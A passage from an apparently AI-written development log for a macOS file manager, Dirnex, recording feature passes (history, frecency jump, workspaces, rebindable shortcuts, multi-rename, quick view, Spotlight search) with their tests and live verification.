  swiftformat/swiftlint-strict clean (pre-existing repo-wide `op`/`st` `identifier_name`
  strict failures in UNTOUCHED `UndoJournalTests`/`LocalBackend` flagged as a separate task,
  not this pass's).
- **Verified live via computer-use** (no overlay this session — mouse + keyboard worked;
  drove the Go menu since it's the registry surface): the Go menu shows "Favorites…
  ⌃D" + "Add to Favorites"; Add pinned `/Users/oleg` then `/Users/oleg/Downloads`; the ⌃D
  popup dropped under the path bar showing both with folder icons + 1/2 accelerators and the
  toggle correctly reading "Remove Current Folder" (current dir pinned); picking **oleg**
  jumped the active pane there; the organizer inline-renamed `oleg`→"Home Folder" (persisted,
  confirmed in UserDefaults), drag-reordered Downloads above Home Folder (persisted), and the
  `−` button removed the selected entry; the list survived an app relaunch. GOTCHA (caught +
  fixed live): the first organizer drag no-op'd and left a collapsed row — `.gap` feedback
  plus a too-strict `validateDrop` (source-identity check + `.above`-only) rejected the drop;
  switching to a pasteboard-type check, retargeting `.on`→`.above`, and dropping `.gap` made
  reorder land first try. Test pins cleared after (defaults delete) so no test state left in
  the user's app. Deferred to later M3: per-panel history, frecency jump, workspaces,
  Settings, rebindable shortcuts.

Progress (2026-07-08, M3 pass 3): **per-panel history** landed — the third M3 item and
the browser-style back/forward trail each tab keeps. Cmd+[ / Cmd+] walk it, Alt+Down pops
the visited-directory list; all three hang off the same command registry as passes 1–2.

- **Core** (`DirnexCore/…/Services/NavigationHistory.swift`, new). A pure value type — the
  browser tab-history model: `entries: [VFSPath]` oldest→newest + a `currentIndex`, seeded
  with the tab's starting path so it's never empty. `visit(path)` records a fresh navigation
  (drops the forward entries, appends, points current at the tip) but **no-ops when the path
  equals the current one** (a refresh, or the initial load landing on the seed, never bloats
  the trail); `back()`/`forward()` only move the cursor and return where to go (`nil` at an
  edge); `jump(to:)` lands on an arbitrary entry (the Alt+Down popup) without truncating;
  `canGoBack`/`canGoForward` drive menu enablement. Bounded (default 100), trimming the oldest
  while shifting `currentIndex` so it keeps pointing at the same path. No AppKit/persistence —
  session-scoped, the app owns the tab that stores it (frecency's *persistent* visit tracking
  is the next M3 item). `CommandCatalog` gains three nav commands: `go.back` (⌘[), `go.forward`
  (⌘]), `go.history` ("Directory History…", ⌥↓). New `NavigationHistoryTests` (+9) + catalog
  presence/shortcut-display cases (+2) → **core suite 185**, all green; swiftformat/
  swiftlint-strict clean.
- **App.** `PanelTab` gains a `NavigationHistory` seeded at its path. `navigate(to:…)` grew a
  `recordHistory: Bool = true` flag and records the visit on *successful* load (a vanished dir
  never pollutes the trail); back/forward/jump navigate with `recordHistory: false` so walking
  the trail doesn't rewrite it. New `PanelViewController+History` owns the pane-relative
  actions dispatched through the responder chain: `goBack`/`goForward` step the active tab's
  trail, `showHistory` pops an `NSMenu` from the path-bar edge (matching the ⌃D favorites popup)
  listing the entries **newest-first, current check-marked, folder icon + tooltip path**, a
  pick → `jump`. `CommandBinding`/`MainMenuBuilder` wire all three into the Go menu (a new
  Back/Forward/History group above Go-to-Location); `validateMenuItem` disables Back/Forward
  at the trail edges and steps ⌥↓ aside for a first-responder text field (like ⌃D). Cmd+[ /
  Cmd+] / ⌥↓ ride the menu key-equivalent path, so no `FileTableView` key-model change was
  needed (plain ↑/↓ still move the cursor — the modifiers don't collide). App builds clean;
  app test target green; whole repo swiftformat/swiftlint-strict clean. (`PanelViewController.swift`
  is now exactly at SwiftLint's 500-line `file_length` limit — a further edit there wants a
  decomposition pass, like `+Table`/`+Chrome` before it.)
- **Verified live via computer-use** (no overlay this session — mouse + keyboard both worked;
  navigated the real tree through a `~/history-verify/alpha/x` fixture): the Go menu showed
  Back ⌘[ / Forward ⌘] **greyed at a fresh single-entry history** and Directory History… ⌥↓
  enabled; navigating oleg→history-verify→alpha→x then **⌘[** stepped x→alpha→history-verify
  and **⌘]** returned →alpha (keyboard equivalents fire through the responder chain); **⌥↓**
  dropped the popup listing x / ✓alpha / history-verify / oleg (newest-first, current
  check-marked, home-folder icon on oleg); clicking **oleg** jumped straight there and left
  **Back disabled / Forward enabled** — proving the jump preserved the full trail; then a fresh
  navigate to Downloads **truncated the forward entries** (the popup collapsed to ✓Downloads /
  oleg). Deferred to later M3: frecency jump, workspaces, Settings, rebindable shortcuts.

Progress (2026-07-08, M3 pass 4): **frecency jump** landed — the fourth M3 item, TC has no
equivalent; it's the zoxide-style "type a fragment, land in the right folder" the path bar
gains. Persistent visit tracking + fuzzy resolution, hanging off the same `navigate` and
Cmd+L path bar the earlier passes built.

- **Core** (`DirnexCore/…/Services/Frecency.swift`, new). Pure value types: `FrecencyEntry`
  (path + `rank` + `lastAccess`, `Codable`, identity = path) and `Frecency` (the index,
  de-duplicated by path). `visit(_:now:)` bumps a directory's rank (or inserts at 1) and
  stamps the time, then **ages** — zoxide's algorithm: once the summed rank exceeds `maxAge`
  (default 10,000) scale every rank by `0.9·maxAge/total` and drop entries below 1, so the
  index is self-bounding no matter how long the app runs. `score(for:now:)` is rank × a
  recency multiplier (within the hour 4×, day 2×, week ½×, older ¼×; a future/skewed stamp
  falls into the most-recent bucket). `matches(for:now:)`/`bestMatch` filter to entries whose
  **last path component** is a case-insensitive subsequence of the query ("dl" ⊆ "downloads")
  then sort by score, most-recent, then path — so a folder opened twice this morning beats one
  opened ten times last month. Decoding routes through the de-duping init (legacy/corrupt
  store sanitized; a pre-`maxAge` blob gets the default). New `FrecencyTests` (+13 → **core
  suite 198**): insert/bump, the four recency buckets incl. clock-skew, recency-beats-raw-
  frequency, `dl→Downloads`, last-component-only matching, case-insensitivity, aging-drops-
  below-1, de-dup, and JSON round-trip incl. the legacy-without-`maxAge` case. All green;
  swiftformat/swiftlint-strict clean. GOTCHA per §2: the plan pencils **SQLite** for frecency;
  landed as JSON in `UserDefaults` like the undo journal did (the index is self-bounded by
  aging, so JSON's rewrite-per-visit cost is a non-issue) — SQLite still deferred to when undo
  shares the DB. `CommandCatalog` `go.editLocation` gained keywords (jump/frecency/fuzzy/
  recent) so the palette surfaces it.
- **App.** New `FrecencyStore` (`@MainActor`, one app-wide `.shared` instance held in memory —
  unlike `FavoritesStore`'s read-per-open, because visits stream in continuously from every
  navigation and separate per-window copies would clobber each other): loads the index once,
  `recordVisit` bumps + persists (JSON in `UserDefaults` `Dirnex.frecency`), `rankedMatches`
  reads. Visit recording hooks the **one** place a load succeeds — `navigate`'s success path —
  via a new `PanelViewController+Visits.recordVisit(_:tab:recordHistory:)` that records history
  (conditionally) *and* frecency (always: a back-button jump is still a visit); folded into the
  existing history line as a 1-for-1 replacement so `PanelViewController.swift` stays exactly at
  the 500-line `file_length` limit (its decomposition is still pending, just not forced here).
  So the index learns from crumb clicks, the sidebar, favorites jumps, and back/forward alike.
  The path bar's Return now routes through a new `PathBarViewDelegate.didCommit(rawText:resolved:)`
  (crumb clicks still use `didActivate`); `PanelViewController+PathBar` resolves it: an explicit
  path that `stat`s to a real directory wins, else a **slash-free** fragment falls back to
  `firstExistingFrecencyMatch` (walks the ranked candidates, `stat`-verifying each so a since-
  deleted top hit is skipped, capped at 10), else the typed path navigates so the normal
  not-found sheet still shows. A path *with* a slash is always taken literally, so a mistyped
  explicit path never silently leaps elsewhere. New `DirectoryLoader.stat` bridges the off-main
  existence check. App builds clean (no warnings); whole repo swiftformat/swiftlint-strict clean.
- **Verified live via computer-use** (no overlay this session — mouse worked; drove the Go menu
  since Cmd delivery is unreliable): seeded the index by navigating the active pane oleg →
  Downloads → Documents via the sidebar; Go ▸ Go to Location… prefilled+selected the current
  path, typing **`dl`** replaced it, and **Return jumped the pane straight to ~/Downloads**
  (breadcrump Downloads, 31 items — from Documents' 27) purely through the fuzzy index. The
  persisted `Dirnex.frecency` then read `/Users/oleg` rank 4 / Downloads rank 2 / Documents
  rank 2 — proving visit recording from the sidebar, rank accumulation on revisit, and
  **persistence across relaunch** (the home rank carried over from earlier launches). (Also
  confirmed earlier-in-session by decoding the blob the app-test run left: `/Users/oleg` rank 2,
  both panes' launch-into-home recorded through the same hook.) Test frecency default deleted
  after so no test state remains in the user's app. NEXT M3: workspaces, Settings (SwiftUI),
  rebindable shortcuts (the registry's `CommandShortcut` is the data those edit).

Progress (2026-07-08, M3 pass 5): **workspaces** landed — the fifth M3 item, a named snapshot
of the *whole window* (both panes + all their tabs) the user can save and switch back to. It
follows the same recipe as passes 2–4: a pure headless value type + tests, a `UserDefaults`
JSON store, and wiring into the command registry.

- **Core** (`DirnexCore/…/Services/Workspaces.swift`, new). Pure value types: `WorkspaceTab`
  (a tab's `VFSPath` + `FileSort` — column geometry is deliberately left out, a per-tab view
  nicety not part of a named layout's identity), `WorkspacePane` (`tabs` + a `activeTabIndex`
  that's **clamped into range** on init *and* on decode so a hand-edited/truncated store can't
  point past the end), and `Workspace` (name + left/right panes, identity = name). `Workspaces`
  is the ordered, **name-de-duplicated** collection: `save` overwrites an existing name *in
  place* (keeping its position) else appends and reports which; `remove(name:)`/`remove(at:)`;
  `rename` that **rejects an empty or already-used name** so two entries never collapse into
  one; `move` (Array-semantics reorder); `contains`/`workspace(named:)`. Decoding routes
  through the de-duping init (matching `Favorites`). Made `FileSort` (+ its `Key`) `Codable` — a
  small, purely-additive core change so `WorkspaceTab` serializes cleanly (the app's
  `PersistedTab` still uses its own hand-rolled key/ascending encoding, untouched).
  `CommandCatalog` gains a new **`.workspace` category** ("Workspace" menu) with `workspace.list`
  ("Workspaces…") + `workspace.save` ("Save Workspace…"). New `WorkspacesTests` (+12) + catalog
  coverage (+1) → **core suite 211**, all green; swiftformat/swiftlint-strict clean. GOTCHA (hit
  yet again, per [[swift-testing-expect-optional-arithmetic]]-adjacent): a `mutating` call can't
  sit inside `#expect(...)` — `save`/`remove`/`rename` results were hoisted into a `let`.
- **App.** New `WorkspaceStore` (UserDefaults JSON `Dirnex.workspaces`, read-fresh-per-open like
  `FavoritesStore` — no live-observation plumbing). A workspace spans both panes, which no single
  pane can see, so capture/restore lives on the **window controller**
  (`BrowserWindowController+Workspaces`: `captureWorkspace(named:)` snapshots both panes,
  `applyWorkspace` restores them + focuses left), reached through two new `PanelHost` methods —
  the same pane→host forwarding the undo surface uses. `PanelViewController+Workspaces` owns the
  per-pane `workspaceSnapshot()`/`restore(workspacePane:)` (restore drops vanished dirs like
  relaunch does, and keeps the current dir rather than ending up tab-less if all vanish) plus the
  responder-chain actions: `showWorkspaces` pops an `NSMenu` from the path-bar edge (one switch
  item per workspace carrying its *name* + a 1–9 accelerator + a `square.split.2x1` glyph, then
  Save/Manage), `saveWorkspace` prompts for a name (NSAlert + field) and **confirms before
  replacing** an existing one. `WorkspaceOrganizerController` (new) mirrors the favorites organizer
  — a drag-reorder / inline-rename / `−`-remove sheet, every edit saved immediately; rename that's
  rejected snaps the field back. `CommandBinding`/`MainMenuBuilder` wire both commands into the
  new Workspace menu; the palette's category tag widened 62→72pt (+ truncation) to fit
  "WORKSPACE" (68.5pt overflowed). **Forced the decomposition the pass-3/4 notes predicted**: the
  new `PanelHost` methods pushed `PanelViewController.swift` past its 500-line `file_length`
  limit, so the whole `FileTableViewInput` extension (+ its `redrawRow`/`setFilter` helpers) moved
  to a new `PanelViewController+TableInput.swift` (dropping the file to ~410 lines;
  `syncCursorToTable` went `private`→internal for the cross-file call). App builds clean; whole
  repo swiftformat/swiftlint-strict clean (**110 files**, 0 violations).
- **Verified live via computer-use** (mouse-driven; no overlay): the Workspace menu shows
  "Workspaces…"/"Save Workspace…"; Save prompted, typed **"Work"**, saved with left=Downloads /
  right=~/oleg; changed both panes (left→Documents, right→Movies); Workspaces… ▸ **Work** restored
  *both* panes at once (Downloads 31 / oleg 18). The persisted `Dirnex.workspaces` blob decoded
  to exactly that layout incl. the now-`Codable` `FileSort`. Saved a 2nd ("Browsing"), opened the
  organizer: **drag-reorder landed first try** (the favorites drag fix carried over), inline-rename
  Work→"Projects" persisted, `−` deleted it leaving one; every edit survived a **quit+relaunch**
  (store read `['Browsing']` off disk, popup re-rendered it). Test workspaces deleted after so no
  test state remains in the user's app. Noted UX quirk (shared with the favorites organizer, not new):
  Return in a rename field also fires the Done button (its `\r` key-equivalent), committing +
  closing in one press. NEXT M3: Settings (SwiftUI) + rebindable shortcuts — best done together
  (Settings is the container, the rebind UI its "shortcuts" tab; both edit the registry's
  `CommandShortcut` data), the last two M3 items.

Progress (2026-07-08, M3 pass 6): **Settings window + rebindable shortcuts** landed — the
final two M3 items, done together as planned (Settings is the SwiftUI container; the rebind
UI is its Shortcuts tab). **M3 is now complete.** This is the app's first SwiftUI surface
(§2 "SwiftUI for settings"); the file panes stay AppKit.

- **Core** (`DirnexCore/…/Services/KeyBindings.swift`, new). Made `CommandShortcut` (+ its
  `Modifiers` option-set, via a single-value `Int` container) **`Codable`** so rebindings
  persist as boring JSON. New pure value type `KeyBindings` layered over `CommandCatalog`'s
  defaults: `overrides: [String: Binding]` where `Binding = .shortcut(_)|.unbound` (so a
  default can be *removed*, not just replaced), keyed by command id. `shortcut(for:)` resolves
  the effective binding (override else catalog default); `setShortcut`/`reset`/`resetAll` keep
  the override map minimal (a rebind equal to the default drops the override, so it always
  reads "not customized"); `conflicts(for:)`/`allConflicts()`/`hasConflicts` detect two
  commands sharing an effective shortcut (registry-primary only — the table's secondary
  Finder gestures like ⌘⌫ stay an app concern); `preset(.macOS|.totalCommander)` produces a
  whole scheme (macOS = plain defaults; TC = F3-previews + ⇧F6-rename over the already-TC F5/
  F6/F7/F8) and `matchingPreset` reflects it back (nil = "Custom"). `CommandCatalog` gains
  `app.settings` ("Settings…" ⌘,). New `KeyBindingsTests` (+18 → **core suite 229**): resolve/
  set/unbind/reset, conflict detection, both presets + conflict-freeness, `matchingPreset`,
  and JSON round-trips incl. the Codable-shortcut check. All green; swiftformat/swiftlint clean.
- **App** (`Dirnex/Settings/`, new group per §3). `KeyBindingStore` (`ObservableObject`
  singleton, UserDefaults JSON `Dirnex.keyBindings`, posts `didChange`) + `AppPreferences`
  (`ObservableObject` singleton for the non-shortcut tabs' toggles). `MainMenuBuilder` now
  reads each item's key equivalent from the store's **effective** shortcut (not `Command.shortcut`);
  `AppDelegate` observes `didChange` and **rebuilds the whole menu bar** so a rebind takes
  effect immediately (menu key-equivalents are the firing mechanism — the panel key model was
  untouched). The Cmd+K palette resolves effective shortcuts the same way (`CommandPaletteRowView.configure`
  gained a `shortcut:` param). `app.settings` → `AppDelegate.showSettings` opens
  `SettingsWindowController` (a shared `NSWindowController` hosting the SwiftUI `SettingsView`
  — the AppKit-hosted app can't use SwiftUI's `Settings` scene). The **Shortcuts tab**
  (`ShortcutsSettingsView`) lists every command grouped by category with an inline
  `ShortcutRecorder` (an `NSViewRepresentable` over an AppKit key-capture view that becomes
  first responder and — crucially — overrides `performKeyEquivalent` while recording so ⌘-combos
  are captured, not dispatched to a menu; Esc cancels, Delete unbinds; `CommandShortcut(event:)`
  in `CommandShortcut+AppKit` does the NSEvent→token translation), a preset picker (macOS/TC/
  Custom), a filter field, per-row conflict warnings (red glyph + ⚠︎ + "also assigned to …"),
  a per-command reset, and Restore-Defaults. General/Panels/Operations tabs wire three real,
  behavior-preserving-default `AppPreferences` toggles read at a single point each: **reopen
  last session** (gates the panes' `TabPersistence` restore in `BrowserWindowController`),
  **show hidden files in new tabs** (threaded into the default + restored `PanelTab`s), and
  **confirm before Trash** (a prompt in the F8 flow; permanent delete always confirms). App
  builds clean; whole repo swiftformat/swiftlint-strict clean (121 files, 0 violations).
- **Verified live via computer-use** (mouse + keyboard both worked; no overlay): Dirnex ▸
  Settings… ⌘, opened the window; all four tabs render (General's session toggle shown). The
  Shortcuts tab listed the File commands with correct glyph pills; clicking Rename's pill →
  "Type shortcut…" (accent border) → **⌘R was captured** (proving `performKeyEquivalent`
  intercept — it did *not* fire any menu) → pill showed ⌘R + a reset button + preset flipped
  to **Custom**; the **File menu rebuilt live** to "Rename… ⌘R" (proving the didChange→menu
  rebuild). Binding **New Folder to the same ⌘R** flagged **both** rows red with ⚠︎ and lit the
  header warning (conflict detection). **Restore Defaults** cleared everything (F2/F7 back, no
  warnings); the **Total Commander preset** rebound Rename→⇧F6; the **filter** narrowed to
  "Move to Trash" on "trash". Header polished mid-verification (cramped conflict text →
  icon-only warning + wider 600pt window). Left pristine: persisted blob is `{"overrides":{}}`
  (= defaults), all prefs unset. GOTCHA (recurring): a `mutating` call can't sit in
  `#expect(...)` — results hoisted into a `let`. Deferred: per-workspace palette entries
  (noted in pass 5); the recorder records a *shifted-punctuation* combo as its shifted glyph
  (letters/F-keys/⌘-combos/arrows record exactly) — documented in `CommandShortcut(event:)`.

Exit: a new user can discover copy/move/favorites through the palette alone; power user
can rebind everything. ✅ met — palette (pass 1) + a full rebind UI with conflict detection
and two presets.

### M4 — VFS payoff (L)

Goal: cash in the VFS abstraction from M0.

- [x] `ArchiveBackend`: **browse zip/tar/tgz/7z as folders ✅**, **F5 copy-out ✅**, **Quick Look /
      Quick View inside ✅**, **pack via ⌥F5 ✅**, **nested archives (browse/extract a zip inside a
      zip) ✅** (via `bsdtar`, not libarchive — the C-module gate stays deferred)
- [x] Archive writes: **delete inside zip via F8 ✅ + add-into via paste ⌘V / F5 / F6 ✅**
      (extract → edit the tree → repack → atomic swap; rewrite strategy, journal-safe temp file)
- [x] Multi-rename tool: pattern tokens ([N] name, [C] counter, [E] ext, date tokens),
      regex find/replace, case transforms, live preview table, applies as one undoable batch
- [x] Search (Alt+F7 / palette): mdfind-backed name+content search with filter chips
      (kind, size, date ✅ — tag chip + content-grep fallback for non-indexed volumes deferred)
- [x] Search results → virtual panel listing: normal cursor/selection/F5 on results
- [x] Quick view panel (⌃Q toggle — Cmd+Q quits, Cmd+Shift+Q was free but ⌃Q is the TC key):
      inactive panel becomes live Quick Look/text preview of the file under cursor
- [x] Saved searches as virtual folders in the places strip ✅ — name a results panel via
      Go ▸ Save Search… (⌘S when a results tab is active), it lands in the sidebar's
      **Searches** section (magnifier icon); click to re-run into a fresh results tab;
      right-click → Run / Rename… / Delete

Exit: open a zip, fish two files out, repack — no temp-folder dance; rename 500 photos
by date pattern and undo it; search feeds a panel.

Progress (2026-07-09, interlude — **clipboard copy/paste**, user-requested, outside the
M-numbering): ⌘C / ⌘V / ⌥⌘V between panels plus a Finder-style same-directory duplicate. Core:
three `.edit` commands (`edit.copy` ⌘C, `edit.paste` ⌘V, `edit.pasteMove` ⌥⌘V "Move Items Here")
in `CommandCatalog` (+2 tests → **231 core**), and the Edit menu grew a separator and the three
items. App: new `PanelViewController+Clipboard.swift` — ⌘C writes the marked set's file URLs to
`NSPasteboard.general` (the *general* pboard, so it round-trips with Finder), paste reads them back
and routes through the shared `submitTransfer`, so ⌘C in one pane and ⌘V in the other is
copy/move between panels for free, with the queue, the conflict dialog and both-panes refresh
inherited. **KEY DECISION: copy/paste answer the standard `copy:`/`paste:` responder actions, not
custom selectors** — while a rename or path field editor is first responder it intercepts ⌘C/⌘V as
ordinary *text* copy/paste, and only when the file table is first responder do they reach the pane
as a file op. (The first cut used custom selectors gated off in text fields, which left ⌘C/⌘V dead
*inside* text fields, since no `copy:`/`paste:` menu item existed to route them; the standard
selectors fixed that and removed the greyed-menu wart.) ⌥⌘V has no standard selector, so it stays
custom and *is* gated off in text fields, or it would move a file mid-rename. Same-directory
"copy": the `.ask` resolver auto-returns `.keepBoth` when `context.source.path ==
context.existing.path`, so pasting into an item's own folder produces "<name> copy" with no prompt,
matching Finder — only a copy can self-collide (F5/F6 target the other pane, drop rejects the same
folder) and a same-folder *move* is filtered out before enqueue; a `pasteRecurses` guard mirrors
drop's rejection of pasting a folder into its own subtree. Verified live end to end (cross-pane
copy; same-dir paste → "alpha copy.txt"; ⌥⌘V moved a directory recursively with the original
removed; a genuine collision still raised the rich conflict dialog through the queue; text ⌘C/⌘V
work inside the rename field). GOTCHA hit while verifying (existing behavior, not new): clicking an
already-selected row starts an inline rename Finder-style and clicking away *commits* it — navigate
with arrows during verification.

Progress (2026-07-09, M4 pass 1): the **multi-rename tool** landed — TC's Multi-Rename Tool
(⇧F2), a headline M4 item and the batch-rename power feature (**M4 line 3 now `[x]`**; started
here rather than ArchiveBackend because it's pure-Swift and slots straight into the tested
core→app rhythm, whereas libarchive needs a C-module + vendored-headers infra pass first). Core
`DirnexCore/Services/MultiRename.swift` = a pure planner: `RenameSpec` (name mask + extension
mask + literal/regex find-replace + `RenameCase` fold + `RenameCounter` start/step/zero-pad) →
`MultiRename.plan(for:spec:existingNames:)` → one `RenameProposal` per item (old→new +
`RenameStatus`). Token substitution is a single left-to-right scan (`[N]` base, `[E]` ext,
`[C]` counter, `[Y][M][D]` date + `[h][n][s]` time read off the mtime in the local calendar) so
a filename that literally contains "[C]" is never re-expanded, and unknown/malformed brackets
pass through verbatim. Collision model is deliberately strict-and-safe: a new name may only equal
its own item's original (a pure case change on case-insensitive APFS) — a target that collides
with any *other* existing name, incl. another batch member's original (a swap/chain), is a
blocking `.collision`, and two rows producing the same name are `.duplicate`; that keeps every
applied rename order-independent AND cleanly undoable with plain `moveItem` (no temp-name
juggling). +20 `MultiRenameTests` +1 catalog +2 undo-builder → **254 core tests**; `CommandCatalog`
gains `file.multiRename` (⇧F2, conflict-free); NEW `UndoRecord.multiRename` builder folds the
batch into ONE record of `.restore` steps, so a single Cmd+Z reverses the whole rename. App =
`MultiRenameController` (a `presentAsSheet` NSViewController — NSGridView of controls + tokens
legend + a live two-column preview NSTableView that re-plans on every keystroke via
`controlTextDidChange`; red new-name cells, an "N name conflicts" footer, and a disabled/enabled
"Rename N Items" default button) + `PanelViewController+MultiRename` (gathers `selectionTargets()`
+ the directory's full name set, presents the sheet, and on commit performs the moves off-main
through `moveItem` then journals `UndoRecord.multiRename`); `CommandBinding`/`MainMenuBuilder` wire
it into the File menu right after Rename; `validateMenuItem` enables it on a non-empty selection +
`.rename` capability. Whole repo swiftformat/swiftlint-strict clean. Verified live (mouse-driven,
no overlay; had to fully quit a stale running instance first — `open` re-focuses the old process,
so the new menu item only appeared after a clean relaunch): marked 2 of 4 files, ⇧F2 opened the
tool with an identity preview; typed `photo_[C]` + Digits 2 → live preview
IMG_three.jpg→photo_01.jpg / IMG_two.jpg→photo_02.jpg (counter + zero-pad + `.jpg` preserved),
Rename applied byte-exact on disk (contents intact, IMG_one/notes.txt untouched), and Edit▸**Undo
Rename** reversed the entire batch in one Cmd+Z (both original names + contents back on disk); a
constant `same` mask flagged both rows red with a "2 name conflicts" footer and a disabled Rename
button. GOTCHA (recurring, hit again): `#expect(coll.allSatisfy(\.x))` trips the Testing macro's
throwing analysis — hoist the result into a `let` first. Left the app on Home; test fixtures
deleted. Groundwork note for the ArchiveBackend pass: the macOS SDK ships `libarchive.tbd`
(so `-larchive` links) but has NO `archive.h`/`archive_entry.h` — a C-module target with vendored
headers (or shelling out to `bsdtar`/`ditto`) is the gate. NEXT M4: ArchiveBackend (libarchive),
mdfind search (Alt+F7) → virtual panel, quick-view panel.

Progress (2026-07-09, M4 pass 2): the **quick-view panel** landed — TC's ⌃Q, the smallest
unblocked M4 item (**that M4 line now `[x]`**; picked over ArchiveBackend/search because it's
pure app-layer AppKit with no core changes and no C-module infra). It's a window-wide mode: the
*inactive* pane stops showing its list and becomes a live embedded Quick Look of the file under
the *active* pane's cursor — distinct from the ⌘Y Quick Look, which floats a separate window
over the active pane. NEW `Dirnex/Browser/PanelViewController+QuickView.swift`: each pane lazily
builds a `QLPreviewView(style: .compact)` overlay pinned over its scroll view and toggles it via
`showQuickViewPreview(of:)` / `hideQuickViewPreview()`; `quickViewSourceURL` reports the file
under this pane's cursor (nil on `..`/empty). `BrowserWindowController` owns the on/off flag and
orchestrates: `toggleQuickView` flips it; `updateQuickView` puts the preview opposite the active
pane (active shows its list, inactive previews the active cursor); `panelCursorDidChange` (called
from `updateChrome`, the one hook every cursor move / navigation / mark change / refresh already
funnels through) re-drives the preview; and `setActive` re-runs `updateQuickView` so a Tab focus
switch swaps which pane lists and which previews. Wiring is registry-driven per the M3 rhythm:
`CommandCatalog` gains `view.quickView` (⌃Q, conflict-free — verified by a new `CommandCatalog`
test → **255 core tests**), `CommandBinding` maps it to `toggleQuickViewPanel`, `MainMenuBuilder`
adds it to View after Quick Look, and `validateMenuItem` shows a checkmark tracking the state
(the two checkmark toggles were hoisted into a `validateToggleItem` helper so `validateMenuItem`
stayed under SwiftLint's cyclomatic-complexity 15). Repo swiftformat/swiftlint-strict clean;
app `xcodebuild build` + `swift test` green. VERIFIED LIVE (mouse+keyboard, no overlay; fully
quit the stale instance first per the recurring gotcha): ⌃Q on a fixture folder turned the right
pane into a text preview of `notes.txt`, ↓ tracked the cursor to `readme.md` live; Tab swapped
roles (right pane went active+listing, left pane previewed the right cursor's folder icon), a
real 95 KB PNG rendered its image, and the View menu showed **Quick View Panel ⌃Q** checked;
⌃Q / the menu item toggled it back off, both lists restored. Left the app on Home; fixtures
deleted. GOTCHA 1 (design, cost one rebuild): `QLPreviewView` is NOT opaque — a preview that
doesn't fill the view (a 1×1 PNG, a failed preview) let the covered table bleed through the
margins. Fix: back the preview with an opaque `NSBox` (custom, borderless, `fillColor =
.textBackgroundColor` so it re-resolves on a light/dark switch, unlike a captured `cgColor`) as
its content view. GOTCHA 2 (AppKit API): `QLPreviewView.init(frame:style:)` imports as a genuine
failable `init?` (returns `QLPreviewView?`), not an IUO — so it needs a `guard let`, and the
build errors if you treat the result as non-optional. GOTCHA 3 (test-only): setting `previewItem`
twice in rapid succession (a fast synthetic key batch) races Quick Look's async load and can
leave the *first* item showing — stepping the cursor one key at a time previews correctly, so
this is a synthetic-input artifact, not a user-facing bug. NEXT M4: ArchiveBackend (libarchive),
mdfind search (Alt+F7) → virtual panel.

Progress (2026-07-10, interlude — **two quick-view fixes**, user-requested): app-target only,
`DirnexCore` untouched. **(1) Multi-page PDF zoom.** ROOT CAUSE, found by probing rather than
guessing: `QLPreviewView` only wires magnify-to-zoom for *single-page* PDFs — a multi-page document
renders but pinch does nothing (a 1-page receipt zoomed, a 3-page policy did not). FIX: the opaque
`NSBox` overlay now runs a **dual backend** — `QLPreviewView` for the general case, a PDFKit
**`PDFView`** (`.singlePageContinuous`, `autoScales`, `displaysPageBreaks`) for PDFs, routed by
`isPDF(url)` via `contentTypeKey`/`conforms(to: .pdf)` with an extension fallback; both are pinned
edge to edge, whichever fits is unhidden and the other's document is released. Every PDF now gets
native pinch-zoom and continuous scroll. **(2) Esc closes Quick View, window-wide.** The first cut
only worked while the source pane's table had focus, because clicking *into* the preview moves first
responder to the `PDFView`. Two layers: the `cancelOperation:` path gained a middle branch —
**progressive Esc: clear filter → close Quick View → clear marks** — and `BrowserWindowController`
installs a window-scoped `NSEvent.addLocalMonitorForEvents(.keyDown)` (removed in `deinit`) that
catches Esc wherever focus sits. Deliberately a **raw-event monitor, not a `cancelOperation:`
override**: a focused `PDFView` may never translate Esc into `cancelOperation:` at all (only
responders that call `interpretKeyEvents:`, like `FileTableView`, do — which is exactly why it
"worked only if the source panel had focus"), so a bubbled action would never fire. The monitor
guards on keyCode 53, no modifiers, `isKeyWindow`, Quick View on, and stands aside for
`FileTableView` and `NSText` first responders, which own Esc for progressive-close and
cancel-edit. `toggleQuickView()` now also focuses the active pane's table on every toggle, so
closing while the preview had focus lands focus back on a pane. Verified live: the 3-page PDF
renders and scrolls in `PDFView`, ⌃Q toggles cleanly, and clicking into the preview then ⌃Q returns
focus to the active pane. **UNVERIFIED-LIVE (hard limit):** Esc-close and pinch-zoom — the OS does
not deliver a synthetic ⎋ into the app at all, not even to the raw monitor (confirmed again, with
focus on both the table and the preview), and there is no magnify-gesture synthesis; a physical Esc
does reach the handlers.

Progress (2026-07-10, interlude — **the "F2 doesn't work" bug**, user-reported): a live background
`reloadData` while an inline rename field is open **destroys the edit**. An FSEvents refresh
(`directoryDidChange`) or a directory-size total (`computeDirectorySize`), both ending in
`renderRefresh`, tear the shared field editor out of its cell and — because `NSTableView` recycles
cell views — strand it on the `..` row: the rename silently vanishes and focus jumps. FIX:
`deferRefreshIfRenaming()` guards both refresh sites (skip and set `renamePendingRefresh` while
`renamingEntryID != nil`), replaying the owed refresh in `controlTextDidEndEditing`. The reason it
survived this long: it is **only reproducible with a real FSEvents change landing inside the ~1 s
edit window** — a churning directory like home, Downloads or iCloud — never via a synthetic
F2 → type → Enter, so verifying it needs a shell `touch` in the watched directory mid-edit.

Progress (2026-07-10, M4 pass 3): **Spotlight search → virtual results panel** landed — TC's
Alt+F7 file search, cashing in the VFS abstraction for the first time as a *virtual* listing
(**both M4 search lines now `[x]`**; picked over ArchiveBackend because it's pure Swift + app
AppKit with no C-module infra — libarchive is still gated on the vendored-headers pass). Core
`DirnexCore/Services/SpotlightQuery.swift` = a pure query builder mirroring `MultiRename`'s
planner: a `SpotlightQuery` value (name substring, content substring, `SearchKind` chips
folder/image/audio/movie/document/archive, min-size, `SearchAge` today/week/month/year) →
`metadataPredicate()` renders the raw `kMDItem…` query mdfind speaks (name/content as
`== "*term*"cd`, kinds as a parenthesized `kMDItemContentTypeTree` OR in CaseIterable order,
size as `kMDItemFSSize >=`, date as a **relative** `kMDItemFSContentChangeDate >= $time.now(-N)`
so the string stays deterministic/testable), and `mdfindArguments(scopePath:)` prepends `-onlyin`.
Quotes/backslashes in a term are escaped so they can't break the literal. +15 `SpotlightQueryTests`
+1 catalog test → **271 core tests**; every predicate form was also validated against the real
`/usr/bin/mdfind` from the shell before wiring the UI. `CommandCatalog` gains `go.search` (⌥F7,
conflict-free — distinct from plain-F7 New Folder by its modifier set); NEW `VFSBackendID.search`
tags a virtual listing. App: `SpotlightSearchRunner` (the non-hermetic I/O boundary, like
`DirectoryLoader` — spawns `mdfind` off-main via `Process`, reads-to-EOF then stats each hit into
